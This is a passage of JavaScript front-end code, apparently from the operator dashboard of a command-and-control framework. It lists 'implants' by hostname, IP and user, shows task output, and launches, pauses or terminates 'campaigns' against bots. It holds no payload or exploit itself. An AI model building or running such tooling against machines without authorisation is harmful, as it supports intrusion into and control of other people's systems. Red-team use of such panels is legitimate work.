                  <span>${esc(b.hostname)} [${b.id.substring(0, 8)}]</span>
                  <span style="color:var(--text-muted);font-size:0.65rem">${esc(b.ip_address)}</span>
                </div>`;
              }).join('')}
            </div>
          </div>
        ` : ''}

        <div class="tab-bar">
          <button class="tab-btn ${this.campaignTab === 'overview' ? 'active' : ''}" onclick="app.campaignTab='overview';app.renderCampaignDetail('${id}')">Results (${tasks.length})</button>
          <button class="tab-btn ${this.campaignTab === 'bots' ? 'active' : ''}" onclick="app.campaignTab='bots';app.renderCampaignDetail('${id}')">Implants (${campBots.length})</button>
          <button class="tab-btn ${this.campaignTab === 'config' ? 'active' : ''}" onclick="app.campaignTab='config';app.renderCampaignDetail('${id}')">Config</button>
        </div>
        <div id="camp-tab-content"></div>`;

      const tabEl = document.getElementById('camp-tab-content');

      if (this.campaignTab === 'overview') {
        if (tasks.length === 0) {
          tabEl.innerHTML = '<div class="empty-state"><p>NO RESULTS YET</p></div>';
        } else {
          tabEl.innerHTML = tasks.map(t => `
            <div class="task-result" id="task-${t.id}">
              <div class="task-result-header" onclick="document.getElementById('task-${t.id}').classList.toggle('expanded')">
                ${campStatusBadge(t.status)}
                <span class="task-name">${esc(t.task_name)}</span>
                <span class="task-bot" style="color:var(--text-muted)">${esc(t.hostname)} [${t.bot_id.substring(0, 8)}]</span>
                ${t.completed_at ? `<span style="font-size:0.65rem;color:var(--text-muted)">${timeAgo(t.completed_at)}</span>` : ''}
                <span class="expand-icon">&#9654;</span>
              </div>
              <div class="task-result-body">${t.output ? esc(t.output) : '(no output)'}</div>
            </div>`).join('');
        }
      } else if (this.campaignTab === 'bots') {
        if (campBots.length === 0) {
          tabEl.innerHTML = '<div class="empty-state"><p>NO IMPLANTS ASSIGNED</p></div>';
        } else {
          tabEl.innerHTML = `<div class="table-wrap"><table>
            <thead><tr><th>ID</th><th>Hostname</th><th>IP</th><th>Platform</th><th>User</th><th>Status</th></tr></thead>
            <tbody>${campBots.map(b => `
              <tr>
                <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
                <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
                <td>${esc(b.ip_address)}</td>
                <td>${esc(b.os)}/${esc(b.architecture)}</td>
                <td>${esc(b.username)}</td>
                <td>${statusBadge(b)}</td>
              </tr>`).join('')}</tbody></table></div>`;
        }
      } else if (this.campaignTab === 'config') {
        let configStr = camp.config || '{}';
        try { configStr = JSON.stringify(JSON.parse(configStr), null, 2); } catch(e) {}
        tabEl.innerHTML = `
          <div class="task-result expanded">
            <div class="task-result-body" style="display:block;color:var(--text-primary)">${esc(configStr)}</div>
          </div>`;
      }

      if (camp.status === 'running') {
        this.refreshTimer = setInterval(() => this.renderCampaignDetail(id), 5000);
      }
    } catch (e) {
      c.innerHTML = `<div class="empty-state"><p>Failed to load campaign: ${esc(e.message)}</p><button class="btn-sm" onclick="app.activeCampaignId=null;app.navigate('campaigns')">BACK</button></div>`;
    }
  }

  async toggleCampaignBot(campId, botId, el) {
    if (el.classList.contains('selected')) {
      await this.api.del(`/campaigns/${campId}/bots/${botId}`);
      el.classList.remove('selected');
    } else {
      await this.api.post(`/campaigns/${campId}/bots`, { bot_ids: [botId] });
      el.classList.add('selected');
    }
  }

  async launchCampaign(id) {
    const result = await this.api.post(`/campaigns/${id}/launch`);
    if (result.error) {
      alert(result.error);
      return;
    }
    if (this.activeCampaignId === id) {
      this.renderCampaignDetail(id);
    } else {
      this.refreshCampaigns();
    }
  }

  async pauseCampaign(id) {
    await this.api.put(`/campaigns/${id}`, { status: 'paused' });
    if (this.activeCampaignId === id) {
      this.renderCampaignDetail(id);
    } else {
      this.refreshCampaigns();
    }
  }

  async resumeCampaign(id) {
    await this.api.put(`/campaigns/${id}`, { status: 'running' });
    if (this.activeCampaignId === id) {
      this.renderCampaignDetail(id);
    } else {
      this.refreshCampaigns();
    }
  }

  async deleteCampaign(id) {
    if (!confirm('Terminate this operation?')) return;
    await this.api.del(`/campaigns/${id}`);
    if (this.activeCampaignId === id) {
      this.activeCampaignId = null;
      this.navigate('campaigns');
    } else {
      this.refreshCampaigns();
    }
  }
}

// ===== HELPERS =====
function esc(str) {
  if (!str) return '';
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function timeAgo(dateStr) {
  if (!dateStr) return '-';
  const secs = Math.floor((new Date() - new Date(dateStr)) / 1000);
  if (secs < 10) return 'just now';
  if (secs < 60) return `${secs}s ago`;
  if (secs < 3600) return `${Math.floor(secs / 60)}m ago`;
  if (secs < 86400) return `${Math.floor(secs / 3600)}h ago`;
  return `${Math.floor(secs / 86400)}d ago`;
}

function statusBadge(bot) {
  const diffMin = (new Date() - new Date(bot.last_seen)) / 60000;
  if (diffMin < 5) return '<span class="badge badge-active">ACTIVE</span>';
  if (diffMin < 30) return '<span class="badge badge-inactive">IDLE</span>';
  return '<span class="badge badge-dead">DEAD</span>';
}

function campStatusBadge(status) {
  const map = {
    'created': 'badge-inactive',
    'running': 'badge-executing',
    'paused': 'badge-inactive',
    'completed': 'badge-completed',
    'failed': 'badge-failed',
    'pending': 'badge-pending',
  };
  return `<span class="badge ${map[status] || 'badge-dead'}">${esc(status).toUpperCase()}</span>`;
}

function osTag(os) {
  if (!os) return '???';
  const o = os.toLowerCase();
  if (o.includes('linux')) return 'LNX';
  if (o.includes('windows')) return 'WIN';
  if (o.includes('darwin') || o.includes('mac')) return 'MAC';
  return '???';
}

const app = new App();
